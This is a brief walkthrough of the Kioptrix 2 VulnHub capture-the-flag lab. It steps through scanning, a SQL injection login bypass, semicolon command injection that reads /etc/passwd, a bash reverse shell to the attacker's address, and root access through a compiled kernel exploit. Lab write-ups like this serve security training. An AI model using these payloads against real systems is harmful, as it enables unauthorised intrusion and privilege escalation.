Kioptrix 2 - VulnHub

netdiscover -i eth0

![ki21](https://user-images.githubusercontent.com/15195048/95867730-c4d5b880-0d69-11eb-904e-a97aad4b16d1.png)

nmap -sC -sV 192.168.1.10

![ki22](https://user-images.githubusercontent.com/15195048/95867732-c606e580-0d69-11eb-9e55-4d510adc5aaf.png)

nmap -p- 192.168.1.0

![ki23](https://user-images.githubusercontent.com/15195048/95867734-c69f7c00-0d69-11eb-9977-3e031ffacf3c.png)


dirb http://192.168.1.10


192.168.1.10:80 &192.168.1.10:443

![ki24](https://user-images.githubusercontent.com/15195048/95867735-c7381280-0d69-11eb-86b0-59e30c93b803.png)



SQL Injection

![ki25](https://user-images.githubusercontent.com/15195048/95867738-c7381280-0d69-11eb-9788-67ce7dc5ea60.png)


*Don't forget to try queries with double and single quotes
Login 

![ki26](https://user-images.githubusercontent.com/15195048/95867740-c7d0a900-0d69-11eb-91f3-177510468ff5.png)

This field is vulnerable to command injection using semicolon ;.

;ls -la

![ki27](https://user-images.githubusercontent.com/15195048/95867744-c8693f80-0d69-11eb-839e-88813e1c0faa.png)

;cat /etc/passwd

![ki28](https://user-images.githubusercontent.com/15195048/95867745-c8693f80-0d69-11eb-8492-ee72a515c6f3.png)

;bash -i >& /dev/tcp/192.168.1.5/8888 0>&1

![ki29](https://user-images.githubusercontent.com/15195048/95867746-c901d600-0d69-11eb-895f-83aa030d4dc6.png)

python -c 'import pty; pty.spawn("/bin/bash")'
ls -al
we see index.php
i found usernames and password for mysqlserver.We can log into mysql server using those credentials.

![ki210](https://user-images.githubusercontent.com/15195048/95867750-c99a6c80-0d69-11eb-956a-5343afdeb56b.png)

The website runs a mysql server on port 3306.

Privilege Escalation(ROOT)
uname -a -no specific info
lsb_release -a showed vulnerable kernel.



![ki211](https://user-images.githubusercontent.com/15195048/95867752-c99a6c80-0d69-11eb-9734-482df8a26c1a.png)
search Cent0s 4.5 exploit

Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)


![ki212](https://user-images.githubusercontent.com/15195048/95867756-ca330300-0d69-11eb-82c3-de18a94890c2.png)


Start a python server in order to grab this file from our victim machine.
Grab it,compile it 
gcc -o toRun 9542.c #compile it
 make it executable run it and ROOOTEEEED!
 
